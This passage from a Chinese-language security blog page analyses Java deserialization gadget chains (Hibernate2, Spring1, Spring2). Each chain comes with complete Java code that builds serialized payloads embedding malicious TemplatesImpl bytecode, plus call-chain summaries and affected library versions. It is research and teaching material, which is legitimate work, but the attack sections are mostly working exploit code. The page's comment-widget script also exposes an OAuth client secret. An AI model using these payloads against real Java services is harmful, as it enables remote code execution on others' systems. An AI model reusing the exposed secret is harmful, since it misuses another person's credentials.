+			Class&lt;?&gt;       getterImpl  = Class.forName(&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;);
+			Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[0];
+			constructor.setAccessible(true);
+			getter = constructor.newInstance(null, null, method);
+		} catch (Exception ignored) {
+			// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
+			Class&lt;?&gt;       basicGetter = Class.forName(&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;);
+			Constructor&lt;?&gt; constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
+			constructor.setAccessible(true);
+			getter = constructor.newInstance(rs.getClass(), method, &quot;databaseMetaData&quot;);
+		}
+
+		// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法
+		Object tuplizer = SerializeUtil.createInstanceUnsafely(pojoComponentTuplizerClass);
+
+		// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
+		Field field = abstractComponentTuplizerClass.getDeclaredField(&quot;getters&quot;);
+		field.setAccessible(true);
+		Object getters = Array.newInstance(getter.getClass(), 1);
+		Array.set(getters, 0, getter);
+		field.set(tuplizer, getters);
+
+		// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法
+		Object type = SerializeUtil.createInstanceUnsafely(componentTypeClass);
+
+		// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件
+		Field field1 = componentTypeClass.getDeclaredField(&quot;componentTuplizer&quot;);
+		field1.setAccessible(true);
+		field1.set(type, tuplizer);
+
+		Field field2 = componentTypeClass.getDeclaredField(&quot;propertySpan&quot;);
+		field2.setAccessible(true);
+		field2.set(type, 1);
+
+		Field field3 = componentTypeClass.getDeclaredField(&quot;propertyTypes&quot;);
+		field3.setAccessible(true);
+		field3.set(type, new Type[]{(Type) type});
+
+		// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法
+		TypedValue typedValue = new TypedValue((Type) type, null);
+
+		// 创建反序列化用 HashMap
+		HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();
+		hashMap.put(typedValue, &quot;su18&quot;);
+
+		// put 到 hashmap 之后再反射写入，防止 put 时触发
+		Field valueField = TypedValue.class.getDeclaredField(&quot;value&quot;);
+		valueField.setAccessible(true);
+		valueField.set(typedValue, rs);
+
+		SerializeUtil.writeObjectToFile(hashMap, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<h2 id="总结-4">总结</h2>
+<p>以上就是 Hibernate2 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>前期调用链一样，最后的触发点由 TemplatesImpl 的 <code>getOutputProperties</code> 方法换为 JdbcRowSetImpl 的 <code>getDatabaseMetaData</code></li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>java.util.HashMap#readObject()</code></li>
+<li>sink gadget：<code>com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData()</code></li>
+<li>chain gadget：<code>org.hibernate.tuple.component.PojoComponentTuplizer#getPropertyValues()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>HashMap.readObject()
+    TypedValue.hashCode()
+        ValueHolder.getValue()
+            ValueHolder.DeferredInitializer().initialize()
+                ComponentType.getHashCode()
+                    PojoComponentTuplizer.getPropertyValue()
+                        AbstractComponentTuplizer.getPropertyValue()
+                            BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()
+                                JdbcRowSetImpl.getDatabaseMetaData()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>Hibernate : 3-5</p>
+</blockquote>
+<h1 id="spring1">Spring1</h1>
+<h2 id="前置知识-4">前置知识</h2>
+<h3 id="methodinvoketypeprovider">MethodInvokeTypeProvider</h3>
+<p>在 Spring 核心包中存在这样一个内部类：<code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code>，这个类实现了 TypeProvider 接口，是一个可以被反序列化的类。</p>
+<p>看一下 <code>readObject</code> 方法，调用了 ReflectionUtils 先是 <code>findMethod</code> 返回 Method 对象然后紧接着调用 <code>invokeMethod</code> 反射调用。注意，这里的调用是无参调用。</p>
+<figure data-type="image" tabindex="21"><img src="https://su18.org/post-images/1627372259965.png" alt="" loading="lazy"></figure>
+<p>不过是在 <code>this.provider.getType().getClass()</code> 中寻找。如果在这里把 methodName 改为 <code>newTransformer</code> 方法，然后把 <code>this.provider.getType()</code> 想办法处理成 TemplatesImpl ，就可以触发漏洞了。</p>
+<h3 id="objectfactorydelegatinginvocationhandler">ObjectFactoryDelegatingInvocationHandler</h3>
+<p><code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code> 是 InvocationHandler 的实现类，实例化时接收一个 ObjectFactory 对象，并在 invoke 代理时调用 ObjectFactory 的 getObject 方法返回 ObjectFactory 的实例用于 Method 的反射调用。</p>
+<figure data-type="image" tabindex="22"><img src="https://su18.org/post-images/1627373501927.png" alt="" loading="lazy"></figure>
+<p>ObjectFactory 的 getObject 方法返回的对象是泛型的，那就可以可用 AnnotationInvocationHandler 来代理，返回任意对象。</p>
+<p>而 ObjectFactoryDelegatingInvocationHandler 自己本身就是代理类，可以用它代理之前的TypeProvider 的 getType 方法。</p>
+<h2 id="攻击构造-5">攻击构造</h2>
+<p>Spring1 的动态代理构造有些复杂，建议大家先看前面两个前置知识里写的类自己思考一下怎么将其结合，这里尽量拆分代码：</p>
+<pre><code class="language-java">public class Spring1 {
+
+	public static String fileName = &quot;Spring1.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+
+		// 生成包含恶意类字节码的 TemplatesImpl 类
+		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
+
+		// 使用 AnnotationInvocationHandler 动态代理
+		Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+		Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
+		constructor.setAccessible(true);
+
+		HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();
+		map.put(&quot;getObject&quot;, tmpl);
+
+		// 使用动态代理初始化 AnnotationInvocationHandler
+		InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);
+
+		// 使用 AnnotationInvocationHandler 动态代理 ObjectFactory 的 getObject 方法，使其返回 TemplatesImpl
+		ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(
+				ClassLoader.getSystemClassLoader(), new Class[]{ObjectFactory.class}, invocationHandler);
+
+		// ObjectFactoryDelegatingInvocationHandler 的 invoke 方法触发 ObjectFactory 的 getObject
+		// 并且会调用 method.invoke(返回值,args)
+		// 此时返回值被我们使用动态代理改为了 TemplatesImpl
+		// 接下来需要 method 是 newTransformer()，就可以触发调用链了
+		Class&lt;?&gt;       clazz          = Class.forName(&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;);
+		Constructor&lt;?&gt; ofdConstructor = clazz.getDeclaredConstructors()[0];
+		ofdConstructor.setAccessible(true);
+		// 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler
+		InvocationHandler ofdHandler = (InvocationHandler) ofdConstructor.newInstance(factory);
+
+		// ObjectFactoryDelegatingInvocationHandler 本身就是个 InvocationHandler
+		// 使用它来代理一个类，这样在这个类调用时将会触发 ObjectFactoryDelegatingInvocationHandler 的 invoke 方法
+		// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类
+		// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法
+		Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+				new Class[]{Type.class, Templates.class}, ofdHandler);
+
+
+		// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类
+		HashMap&lt;String, Object&gt; map2 = new HashMap&lt;&gt;();
+		map2.put(&quot;getType&quot;, typeTemplateProxy);
+
+		InvocationHandler newInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map2);
+
+		Class&lt;?&gt; typeProviderClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;);
+		// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy
+		Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+				new Class[]{typeProviderClass}, newInvocationHandler);
+
+
+		// 初始化 MethodInvokeTypeProvider
+		Class&lt;?&gt;       clazz2 = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;);
+		Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[0];
+		cons.setAccessible(true);
+		// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())
+		// 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去
+		Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod(&quot;toString&quot;), 0);
+		Field  field   = clazz2.getDeclaredField(&quot;methodName&quot;);
+		field.setAccessible(true);
+		field.set(objects, &quot;newTransformer&quot;);
+
+		SerializeUtil.writeObjectToFile(objects, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<h2 id="总结-5">总结</h2>
+<p>以上就是 Spring1 链分析的全部内容了，不得不说，动态代理真是让这帮人玩明白了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>多次动态代理，利用动态代理的反射调用机制延长调用链，Spring1 的链与 Groovy 有些类似。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider#readObject()</code></li>
+<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()</code></li>
+<li>chain gadget：<code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler#invoke()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()
+    SerializableTypeWrapper.TypeProvider(Proxy).getType()
+	    AnnotationInvocationHandler.invoke()
+		    ReflectionUtils.invokeMethod()
+			    Templates(Proxy).newTransformer()
+				    AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke()
+					    ObjectFactory(Proxy).getObject()
+						    TemplatesImpl.newTransformer()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>spring-core : 4.1.4.RELEASE<br>
+spring-beans : 4.1.4.RELEASE<br>
+jdk 1.7</p>
+</blockquote>
+<h1 id="spring2">Spring2</h1>
+<p>Spring2 在 Spring1 的触发链上有所变换，替换了 spring-beans 的 ObjectFactoryDelegatingInvocationHandler，使用了 spring-aop 的 JdkDynamicAopProxy ，并完成了后续触发 TemplatesImpl 的流程。</p>
+<h2 id="前置知识-5">前置知识</h2>
+<h3 id="jdkdynamicaopproxy">JdkDynamicAopProxy</h3>
+<p><code>org.springframework.aop.framework.JdkDynamicAopProxy</code> 类是 Spring AOP 框架基于 JDK 动态代理的实现，同时其还实现了 AopProxy 接口。</p>
+<p>我们来看一下 invoke 方法，获取 AdvisedSupport 里的 TargetSource，并调用 <code>getTarget()</code> 方法返回其中的对象。</p>
+<figure data-type="image" tabindex="23"><img src="https://su18.org/post-images/1627522830580.png" alt="" loading="lazy"></figure>
+<p>调用 <code>AopUtils#invokeJoinpointUsingReflection()</code> 方法反射调用对象的 method 方法并返回。</p>
+<figure data-type="image" tabindex="24"><img src="https://su18.org/post-images/1627522834769.png" alt="" loading="lazy"></figure>
+<p>方法里就是简单的反射调用。</p>
+<figure data-type="image" tabindex="25"><img src="https://su18.org/post-images/1627522838105.png" alt="" loading="lazy"></figure>
+<p>由此我们可以看到 JdkDynamicAopProxy 这个 InvocationHandler 类可以出色的完成 TemplatesImpl 的对象调用，可以直接配合 Spring1 中的触发调用链。</p>
+<h2 id="攻击构造-6">攻击构造</h2>
+<p>与 Spring1 类似，直接上代码：</p>
+<pre><code class="language-java">public class Spring2 {
+
+	public static String fileName = &quot;Spring2.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+
+		// 生成包含恶意类字节码的 TemplatesImpl 类
+		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
+
+		// 实例化 AdvisedSupport
+		AdvisedSupport as = new AdvisedSupport();
+		as.setTarget(tmpl);
+
+		// 使用 AnnotationInvocationHandler 动态代理
+		Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+		Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
+		constructor.setAccessible(true);
+
+		// JdkDynamicAopProxy 的 invoke 方法触发 TargetSource 的 getTarget 返回 tmpl
+		// 并且会调用 method.invoke(返回值,args)
+		// 此时返回值被我们使用动态代理改为了 TemplatesImpl
+		// 接下来需要 method 是 newTransformer()，就可以触发调用链了
+		Class&lt;?&gt;       clazz          = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;);
+		Constructor&lt;?&gt; aopConstructor = clazz.getDeclaredConstructors()[0];
+		aopConstructor.setAccessible(true);
+		// 使用 AdvisedSupport 实例化 JdkDynamicAopProxy
+		InvocationHandler aopProxy = (InvocationHandler) aopConstructor.newInstance(as);
+
+		// JdkDynamicAopProxy 本身就是个 InvocationHandler
+		// 使用它来代理一个类，这样在这个类调用时将会触发 JdkDynamicAopProxy 的 invoke 方法
+		// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类
+		// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法
+		Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+				new Class[]{Type.class, Templates.class}, aopProxy);
+
+
+		// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类
+		HashMap&lt;String, Object&gt; map2 = new HashMap&lt;&gt;();
+		map2.put(&quot;getType&quot;, typeTemplateProxy);
+
+		InvocationHandler newInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map2);
+
+		Class&lt;?&gt; typeProviderClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;);
+		// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy
+		Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+				new Class[]{typeProviderClass}, newInvocationHandler);
+
+
+		// 初始化 MethodInvokeTypeProvider
+		Class&lt;?&gt;       clazz2 = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;);
+		Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[0];
+		cons.setAccessible(true);
+		// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())
+		// 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去
+		Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod(&quot;toString&quot;), 0);
+		Field  field   = clazz2.getDeclaredField(&quot;methodName&quot;);
+		field.setAccessible(true);
+		field.set(objects, &quot;newTransformer&quot;);
+
+		SerializeUtil.writeObjectToFile(objects, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<h2 id="总结-6">总结</h2>
+<p>以上就是 Spring2 链分析的全部内容了，如果理解了 Spring1，那看 Spring2 就很简单了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>使用 JdkDynamicAopProxy 替换 ObjectFactoryDelegatingInvocationHandler，并完成最终的调用链。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider#readObject()</code></li>
+<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()</code></li>
+<li>chain gadget：<code>org.springframework.aop.framework.JdkDynamicAopProxy#invoke()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()
+    SerializableTypeWrapper.TypeProvider(Proxy).getType()
+	    AnnotationInvocationHandler.invoke()
+		    ReflectionUtils.invokeMethod()
+			    Templates(Proxy).newTransformer()
+				    JdkDynamicAopProxy.invoke()
+                        AopUtils.invokeJoinpointUsingReflection()
+						    TemplatesImpl.newTransformer()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>spring-core : 4.1.4.RELEASE<br>
+spring-aop : 4.1.4.RELEASE<br>
+jdk 1.7</p>
+</blockquote>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#commonsbeanutils1">CommonsBeanutils1</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a>
+<ul>
+<li><a href="#propertyutils">PropertyUtils</a></li>
+<li><a href="#beancomparator">BeanComparator</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+<li><a href="#groovy1">Groovy1</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-2">前置知识</a>
+<ul>
+<li><a href="#methodclosure">MethodClosure</a></li>
+<li><a href="#stringexecute-%E6%96%B9%E6%B3%95">String.execute() 方法</a></li>
+<li><a href="#convertedclosure">ConvertedClosure</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-2">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-2">总结</a></li>
+</ul>
+</li>
+<li><a href="#hibernate1">Hibernate1</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-3">前置知识</a>
+<ul>
+<li><a href="#basicpropertyaccessor">BasicPropertyAccessor</a></li>
+<li><a href="#abstractcomponenttuplizer">AbstractComponentTuplizer</a></li>
+<li><a href="#typedvalue">TypedValue</a></li>
+<li><a href="#gettermethodimpl">GetterMethodImpl</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-3">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-3">总结</a></li>
+</ul>
+</li>
+<li><a href="#hibernate2">Hibernate2</a>
+<ul>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-4">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-4">总结</a></li>
+</ul>
+</li>
+<li><a href="#spring1">Spring1</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-4">前置知识</a>
+<ul>
+<li><a href="#methodinvoketypeprovider">MethodInvokeTypeProvider</a></li>
+<li><a href="#objectfactorydelegatinginvocationhandler">ObjectFactoryDelegatingInvocationHandler</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-5">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-5">总结</a></li>
+</ul>
+</li>
+<li><a href="#spring2">Spring2</a>
+<ul>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-5">前置知识</a>
+<ul>
+<li><a href="#jdkdynamicaopproxy">JdkDynamicAopProxy</a></li>
+</ul>
+</li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-6">攻击构造</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93-6">总结</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '21ee097e0f08e9b76b4b',
+    clientSecret: 'bda6c4a0d4dc3f275da2e82d2d59b683274ff195',
+    repo: 'blogtalk',
+    owner: 'su18',
+    admin: ['su18'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  友情链接：<a href="https://www.yzmm.net/" target="_blank">园长</a> <a href="https://www.cnblogs.com/H4ck3R-XiX/" target="_blank">赵公子</a> <a href="https://fynch3r.github.io" target="_blank">fynch3r</a> <a href="https://g1asssy.com/" target="_blank">Glassy@Amadeus</a> <a href="https://iswin.org/" target="_blank">随风</a>  <a href="https://www.9170.org/" target="_blank">健宇</a>  <a href="https://fuzz7j.github.io/" target="_blank">fuzz7j</a>  <a href="https://blog.zgsec.cn/" target="_blank">曾哥</a> | 
+  <a class="rss" href="https://su18.org/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      console.log('section.offsetHeight', section.offsetHeight);
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
